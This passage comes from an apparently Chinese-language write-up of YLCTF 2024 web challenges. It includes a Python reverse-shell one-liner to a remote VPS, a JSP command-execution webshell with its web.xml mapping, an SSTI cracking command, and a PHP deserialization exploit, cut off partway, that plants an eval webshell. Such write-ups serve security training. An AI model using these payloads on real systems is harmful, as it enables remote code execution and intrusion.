</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;flag_is_so_beautiful.php&#34;</span>);
</span></span><span style=display:flex><span>$a<span style=color:#f92672>=@</span>$_POST[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>$key<span style=color:#f92672>=@</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[a-zA-Z]{6}/&#39;</span>,$a);
</span></span><span style=display:flex><span>$b<span style=color:#f92672>=@</span>$_REQUEST[<span style=color:#e6db74>&#39;b&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($a<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>999999</span> <span style=color:#66d9ef>and</span> $key){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_numeric</span>($b)){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($b<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1234</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag2;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
</span></span></span></code></pre></div><p>a是匹配是否有六个字母，b是大于这个数就行函数构造绕过就行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.yuanloo.com:21836/f1ag.php&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;a&#39;</span>: <span style=color:#e6db74>&#39;1000000eeeeee&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;b&#39;</span>: <span style=color:#e6db74>&#39;1235abc&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h5 id=round-1-shxpl>[Round 1] shxpl</h5><p>测试一下常见的ls和cat都被禁用了，这里空格用%09进行绕过，联合查询一下</p><p><img alt=shxpl1 loading=lazy src=/posts/ctf/ylctf2024/shxpl1.png></p><p>然后执行cat /flag 参照上面的内容</p><p><img alt=shxpl2 loading=lazy src=/posts/ctf/ylctf2024/shxpl2.png></p><h5 id=round-1-injct>[Round 1] Injct</h5><p>简单测了一下是xss还是ssti，发现是flask的模板注入，测试一下常见的花括号被禁了，用fenjing看看内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -m fenjing crack --url http://challenge.yuanloo.com:25882/greet --inputs name --method POST
</span></span></code></pre></div><p><img alt=Injct1 loading=lazy src=/posts/ctf/ylctf2024/Injct1.png></p><p>可以shell到但是试了常见的命令不能成功</p><p><img alt=Injct2 loading=lazy src=/posts/ctf/ylctf2024/Injct2.png></p><p>考虑到这是python写的网站，用弹个shell给我的vps,成功拿到shell得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&#34;8.130.42.113&#34;, 5566)); [os.dup2(s.fileno(), i) for i in (0, 1, 2)]; subprocess.call([&#34;/bin/sh&#34;, &#34;-i&#34;])&#39;</span>
</span></span></code></pre></div><p><img alt=shxpl3 loading=lazy src=/posts/ctf/ylctf2024/shxpl3.png></p><h5 id=round-1-toxec复现>[Round 1] TOXEC(复现)</h5><p>测试了一下发现上传jsp文件会直接杀掉，又dirsearch扫了一下发现在<code>WEB-INF</code>有大量的404回显，猜测可能和羊城杯的题目相似(虽然我没写bushi),先上传一个shell.xml,是jsp的回显马</p><p>先上传这个，bp抓包改一下文件名</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;</span>% if(request.getParameter(&#34;cmd&#34;)!=null){  
</span></span><span style=display:flex><span>    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();  
</span></span><span style=display:flex><span>    int a = -1;  
</span></span><span style=display:flex><span>    byte[] b = new byte[2048];  
</span></span><span style=display:flex><span>    out.print(&#34;<span style=color:#f92672>&lt;pre&gt;</span>&#34;);  
</span></span><span style=display:flex><span>    while((a=in.read(b))!=-1){  
</span></span><span style=display:flex><span>        out.print(new String(b));  
</span></span><span style=display:flex><span>    }  
</span></span><span style=display:flex><span>    out.print(&#34;<span style=color:#f92672>&lt;/pre&gt;</span>&#34;);  
</span></span><span style=display:flex><span>}  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>%&gt;
</span></span></code></pre></div><p><img alt=TOXEC loading=lazy src=/posts/ctf/ylctf2024/TOXEC.png></p><p>然后再上传下面这个也需要改成对应的文件格式将上面的xml解析成jsp，传入马</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;web-app</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;4.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;servlet&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;servlet-name&gt;</span>exec<span style=color:#f92672>&lt;/servlet-name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;jsp-file&gt;</span>/WEB-INF/shell.xml<span style=color:#f92672>&lt;/jsp-file&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;load-on-startup&gt;</span>1<span style=color:#f92672>&lt;/load-on-startup&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/servlet&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;servlet-mapping&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;servlet-name&gt;</span>exec<span style=color:#f92672>&lt;/servlet-name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;url-pattern&gt;</span>/orange<span style=color:#f92672>&lt;/url-pattern&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/servlet-mapping&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/web-app&gt;</span>
</span></span></code></pre></div><p>最后的结果如下</p><p><img alt=TOXEC1 loading=lazy src=/posts/ctf/ylctf2024/TOXEC1.png></p><h5 id=round-1-pexpl复现>[Round 1] pExpl(复现)</h5><p>先上源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $fileHandle;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $fileName;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($fileName, $mode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;r&#39;</span>) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span> <span style=color:#f92672>=</span> $fileName;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($fileName, $mode);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Unable to open file: </span><span style=color:#e6db74>$fileName</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File opened: </span><span style=color:#e6db74>$fileName\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>readLine</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>fgets</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>writeLine</span>($data) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fwrite</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>, $data <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span>) <span style=color:#f92672>&amp;&amp;!</span><span style=color:#66d9ef>empty</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fclose</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File closed: </span><span style=color:#e6db74>{</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span><span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $userData <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__set</span>($name, $value) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($name <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;password&#39;</span>) {
</span></span><span style=display:flex><span>            $value <span style=color:#f92672>=</span> <span style=color:#a6e22e>password_hash</span>($value, <span style=color:#a6e22e>PASSWORD_DEFAULT</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>userData</span>[$name] <span style=color:#f92672>=</span> $value;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($name) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>userData</span>[$name] <span style=color:#f92672>??</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_string</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_array</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>count</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>call_user_func</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Hello&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__isset</span>($name) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>userData</span>[$name]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Logger</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $logFile;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $lastEntry;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($logFile <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;application.log&#39;</span>) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span> <span style=color:#f92672>=</span> $logFile;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>log</span>($level, $message) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lastEntry</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;Y-m-d H:i:s&#34;</span>) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;] [</span><span style=color:#e6db74>$level</span><span style=color:#e6db74>] </span><span style=color:#e6db74>$message</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>lastEntry</span>, <span style=color:#a6e22e>FILE_APPEND</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setLogFile</span>($logFile) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span> <span style=color:#f92672>=</span> $logFile;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>clearOldLogs</span>($daysToKeep <span style=color:#f92672>=</span> <span style=color:#ae81ff>30</span>) {
</span></span><span style=display:flex><span>        $files <span style=color:#f92672>=</span> <span style=color:#a6e22e>glob</span>(<span style=color:#e6db74>&#34;*.log&#34;</span>);
</span></span><span style=display:flex><span>        $now <span style=color:#f92672>=</span> <span style=color:#a6e22e>time</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> ($files <span style=color:#66d9ef>as</span> $file) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_file</span>($file)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ($now <span style=color:#f92672>-</span> <span style=color:#a6e22e>filemtime</span>($file) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>60</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>60</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>24</span> <span style=color:#f92672>*</span> $daysToKeep) {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>unlink</span>($file);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__call</span>($name, $arguments) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $validLevels <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;info&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>, <span style=color:#e6db74>&#39;error&#39;</span>, <span style=color:#e6db74>&#39;debug&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($name, $validLevels)) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>strtoupper</span>($name), $arguments[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Invalid log level: </span><span style=color:#e6db74>$name</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>($message, $level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;INFO&#39;</span>) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log</span>($level, $message);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&lt;\?php/i&#39;</span>,$_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $exp <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Test!&#34;</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/&lt;\?php/i&#39;</span>,$_GET[<span style=color:#e6db74>&#39;exp&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $exp <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;exp&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Test!&#34;</span>);
</span></span></code></pre></div><p>根据这里可以使用php的短标签，<code>throw new Exception("Test!");</code>可以利用GC机制进行绕过,简单的来说就用构造数组进行绕过</p><p>再分析一下上面的pop链</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span>) <span style=color:#f92672>&amp;&amp;!</span><span style=color:#66d9ef>empty</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fclose</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileHandle</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File closed: </span><span style=color:#e6db74>{</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span><span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><code>echo</code>可以触发<code>__toString</code>魔术</p><pre tabindex=0><code>public function __toString() {
        if(is_string($this-&gt;params) &amp;&amp; is_array($this-&gt;data) &amp;&amp; count($this-&gt;data) &gt; 1){
            call_user_func($this-&gt;data,$this-&gt;params);
        }
        return &#34;Hello&#34;;
    }
</code></pre><p><code>call_user_func</code> 函数用于回调构造，不能直接触发命令执行，由于有参数限制，也不能直接调用，可以尝试构造不存在的函数以此来触发<code>__call</code>魔术</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__call</span>($name, $arguments) {
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>        $validLevels <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;info&#39;</span>, <span style=color:#e6db74>&#39;warning&#39;</span>, <span style=color:#e6db74>&#39;error&#39;</span>, <span style=color:#e6db74>&#39;debug&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($name, $validLevels)) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>strtoupper</span>($name), $arguments[<span style=color:#ae81ff>0</span>]);<span style=color:#75715e>//调用 log 方法，传递日志级别（转换为大写）和第一个参数 $arguments[0]，这通常是要记录的消息。
</span></span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34;Invalid log level: </span><span style=color:#e6db74>$name</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>需要调用到 <code>array</code> 中的一个，然后在触发文件写入，构造exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $fileHandle;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $fileName;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($fileName) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fileName</span> <span style=color:#f92672>=</span> $fileName;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $userData <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Logger</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $logFile;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $lastEntry;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($logFile) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>logFile</span> <span style=color:#f92672>=</span> $logFile;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>// 创建 Logger 对象
</span></span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Logger</span>(<span style=color:#e6db74>&#34;/var/www/html/1.php&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// 创建 User 对象
</span></span></span><span style=display:flex><span>$b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>// 为 User 对象的属性赋值
</span></span></span><span style=display:flex><span>$b<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> [$c, <span style=color:#e6db74>&#34;info&#34;</span>];
</span></span><span style=display:flex><span>$b<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?=@eval($_POST[1]);?&gt;&#39;</span>;  
</span></span><span style=display:flex><span><span style=color:#75715e>// 创建 FileHandler 对象，传入 User 对象
</span></span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FileHandler</span>($b);
</span></span><span style=display:flex><span><span style=color:#75715e>// 序列化并替换特定字符串
</span></span></span><span style=display:flex><span>$a1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>($a, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>$s <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($a1);
</span></span><span style=display:flex><span>$s <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;1;N&#39;</span>, <span style=color:#e6db74>&#39;0;N&#39;</span>, $s);
